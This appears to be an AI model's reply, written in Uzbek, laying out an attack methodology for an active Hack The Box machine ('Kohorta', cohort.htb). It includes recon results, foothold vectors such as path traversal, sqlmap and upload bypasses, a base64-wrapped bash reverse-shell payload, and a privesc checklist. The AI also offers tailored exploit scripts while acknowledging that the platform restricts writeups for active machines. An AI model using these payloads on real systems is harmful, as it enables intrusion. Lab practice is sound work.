# HTB Kohorta — Easy Linux (10.129.244.174)

## ⚠️ 1. Muhim: writeup mavjud emas (va bo'lishi ham mumkin emas)

Qidirdim: **web, GitHub, HTB bazasi** — Kohorta uchun hech qanday writeup yo'q.

**Sababi:** sizning sahifangizda `Submit Flag` tugmalari va timer (`07:56:58`) bor
→ Kohorta — **ACTIVE machine**. HTB qoidalari **active** machine'lar uchun writeup
e'lon qilishni **taqiqlaydi** (faqat *retired* machine'lar uchun ruxsat).

Ya'ni: internetda topilmaydi, chunki **hali yozilmagan** — va yozilsa ham ToS buzilishi bo'ladi.
Shuning uchun sizga writeup emas, **ishlaydigan metodologiya + skriptlar** beraman.

## ⚠️ 2. VPN shart (aks holda hech narsa ishlamaydi)

Kohorta ham `10.x` private IP'da → **bir xil VPN** kerak. Sizda `RX = 0` muammosi bor edi
(ISP OpenVPN trafigini o'ldiryapti). Tekshirish:

```bash
ip -s link show tun0        # RX > 0 bo'lishi SHART
timeout 5 bash -c 'echo > /dev/tcp/10.129.244.174/80' && echo "✅ OPEN" || echo "❌"
```

`RX = 0` bo'lsa → **telefon hotspot** yoki **Pwnbox**. Bu Kohorta'da ham, har qanday
machine'da ham bir xil muammo.

---

## 3. Skriptlar

| Fayl | Vazifa | Sinov |
|---|---|---|
| `01_recon.sh` | /etc/hosts, tun0 MTU, port sweep, servis scan, OS detect | ✅ real |
| `02_web_enum.sh` | texnologiya, standart fayllar, dir brute, vhost | ✅ real |
| `03_privesc.sh` | target ichida: sudo/SUID/capabilities/cron/parollar | ✅ real (exit 0) |
| `04_vpn_check.sh` | VPN/target ulanish diagnostikasi (Windows konflikt aniqlash) | ✅ real |
| `05_vhost_enum.sh` | **vhost/subdomain** enum (wildcard cert uchun MUHIM) | ✅ mock (3/3 topdi) |
| `06_dir_brute.sh` | papka/fayl brute — sof curl fallback | ✅ mock (3/3 topdi) |
| `mock_vhosts.py` | 05/06 ni sinash uchun soxta multi-vhost server | — |

```bash
echo "10.129.244.174 cohort.htb cohort" | sudo tee -a /etc/hosts
sudo bash 01_recon.sh 10.129.244.174
bash 05_vhost_enum.sh                          # MUHIM: wildcard cert
bash 02_web_enum.sh cohort.htb                 # yoki BASE=https://portal.cohort.htb
sudo bash 03_privesc.sh                        # target ICHIDA
```

### Topilgan recon natijasi (2026-10-15)

| Port | Servis |
|---|---|
| 22 | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 |
| 80 | nginx 1.24.0 → redirect **`https://cohort.htb/`** |
| 443 | nginx 1.24.0, cert `CN=cohort.htb`, ORG **Cohort Analytics**, SAN: `cohort.htb`, **`*.cohort.htb`** |

> ⚠️ Mashina nomi **Kohorta**, lekin domen **`cohort.htb`**.
> **Wildcard SAN** (`*.cohort.htb`) → **subdomain'lar bor** → `05_vhost_enum.sh` majburiy.

---

## 4. Metodologiya — Easy Linux

### Qadam 1: Recon
```bash
sudo ./01_recon.sh 10.129.244.174
cat scans/svc.nmap
```
**Easy boxda odatiy portlar:** 22 (SSH), 80/8080 (web), 21 (FTP), 445, 139.
**Muhim:** SSH banner versiyasi, web `Server:` header, `nmap -sC` NSE natijalari.

### Qadam 2: Web enumeration
```bash
./02_web_enum.sh kohorta.htb
```
Diqqat qilinadigan narsalar:
- `/robots.txt`, `/.git/`, `/backup.zip`, `/.env`, `/.ssh/`
- login sahifasi, upload formasi, `/admin`
- CMS nomi (`whatweb` chiqishi) → keyin **searchsploit**

### Qadam 3: Foothold — Easy boxda eng ko'p uchraydigan vektorlar

| Vektor | Tekshirish |
|---|---|
| **Default creds** | `admin:admin`, `admin:password`, CMS default |
| **Web app CVE** | `searchsploit <cms> <version>` |
| **LFI / path traversal** | `?page=../../../../etc/passwd` |
| **Upload** | `.php`, `.phtml`, `.php5`, double extension |
| **SQLi** | `sqlmap -u "http://host/?id=1" --batch` |
| **Anonymous FTP** | `ftp host` → `anonymous` / `anonymous` |
| **SMB** | `smbclient -L //host -N`, `enum4linux -a host` |
| **SSH keys** | web'da topilgan `id_rsa` → `ssh -i` |
| **Tomcat/Jenkins** | `/manager/html`, `/script` |
| **Hostname vhost** | `ffuf -H "Host: FUZZ.kohorta.htb"` |

### Qadam 4: Reverse shell (web RCE bo'lsa)
```bash
# Kali
nc -lvnp 4444
# payload (LHOST = tun0 IP)
LHOST=$(ip -4 addr show tun0 | grep -oP 'inet \K[\d.]+')
echo "bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | base64 -w0
# targetda:  echo <B64> | base64 -d | bash
```

### Qadam 5: Privesc
```bash
bash 03_privesc.sh                       # avtomatik checklist
./linpeas.sh                             # to'liq skan
```
Ustuvorlik tartibi:
1. `sudo -l` → **GTFOBins** (https://gtfobins.github.io/)
2. SUID/SGID → GTFOBins
3. cron → writable skript / PATH hijack
4. capabilities → `getcap -r / 2>/dev/null`
5. guruh: `docker` / `lxd` / `disk` → root
6. kernel/CVE → `searchsploit "linux <kernel>" local`
7. parollar → `.bash_history`, `.env`, config, DB

---

## 5. Qanday davom etamiz

1. **Avval VPN** (hotspot/Pwnbox) — `RX > 0` bo'lsin
2. `sudo ./01_recon.sh 10.129.244.174`
3. **`scans/svc.nmap` chiqishini yuboring** → men topilgan servislarga qarab
   aniq foothold skriptini yozaman (BlockSynergy'da qilganimdek)
4. Shell olgach: `03_privesc.sh` chiqishini yuboring → aniq privesc yo'lini aytaman

> Kohorta **Easy** — BlockSynergy (Insane) bilan solishtirganda ancha sodda.
> Recon natijasini ko'rsam, foothold'ni tez topaman.